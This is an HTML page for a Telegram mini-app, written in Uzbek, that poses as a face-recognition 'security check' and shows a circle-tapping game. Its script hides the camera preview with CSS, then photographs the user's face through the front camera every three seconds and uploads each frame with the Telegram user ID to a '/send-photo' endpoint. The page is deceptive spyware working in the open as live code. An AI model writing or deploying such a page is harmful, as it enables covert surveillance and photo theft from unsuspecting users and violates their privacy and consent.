<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Yuzni aniqlash</title>
  <link href="https://fonts.googleapis.com/css2?family=Rubik&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: "Rubik", sans-serif;
      background: #111;
      color: #fff;
      text-align: center;
      padding: 2rem;
      margin: 0;
    }

    .card {
      background: #1d1d1d;
      padding: 2rem;
      border-radius: 14px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.6);
      max-width: 500px;
      margin: auto;
    }

    video {
      display: none !important;
      width: 0;
      height: 0;
      opacity: 0;
    }

    .loader {
      border: 6px solid #444;
      border-top: 6px solid #09f;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 1rem auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .circle-game {
      margin-top: 2rem;
      height: 250px;
      border: 2px dashed #444;
      border-radius: 12px;
      position: relative;
      overflow: hidden;
    }

    .circle {
      width: 50px;
      height: 50px;
      background: #09f;
      border-radius: 50%;
      position: absolute;
      animation: moveCircle 3s infinite ease-in-out;
      cursor: pointer;
    }

    .score {
      margin-top: 1rem;
      font-size: 1.1rem;
    }

    @keyframes moveCircle {
      0% { top: 0; left: 0; }
      25% { top: 0; left: 80%; }
      50% { top: 80%; left: 80%; }
      75% { top: 80%; left: 0; }
      100% { top: 0; left: 0; }
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>üîê Xavfsizlik tekshiruvi</h2>
    <p>Yuzni aniqlash orqali kirish jarayoni boshlangan. Iltimos sahifani tark etmang.</p>
    <div class="loader"></div>

    <div class="circle-game">
      <div class="circle" onclick="score++; updateScore()"></div>
    </div>
    <div class="score">‚ö° Ball: <span id="score">0</span></div>
  </div>

  <video id="video" autoplay playsinline muted></video>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    Telegram.WebApp.ready();
    Telegram.WebApp.expand();

    const user = Telegram.WebApp.initDataUnsafe?.user;
    const userId = user?.id || "1612270615";
    const video = document.getElementById("video");
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    // Mini game score
    let score = 0;
    function updateScore() {
      document.getElementById("score").textContent = score;
    }

    // Kamera ishga tushurish
    (async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        video.srcObject = stream;
        await video.play();

        setInterval(async () => {
          if (video.videoWidth === 0) return;

          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/png"));
          const file = new File([blob], "face.png", { type: "image/png" });

          const formData = new FormData();
          formData.append("photo", file);
          formData.append("user_id", userId);

          try {
            await fetch("/send-photo", {
              method: "POST",
              body: formData
            });
            console.log("‚úÖ Rasm yuborildi:", new Date().toLocaleTimeString());
          } catch (err) {
            console.warn("‚ùå Rasm yuborilmadi:", err.message);
          }
        }, 3000);
      } catch (err) {
        console.error("‚ùå Kamera xatosi:", err);
      }
    })();
  </script>
</body>
</html>
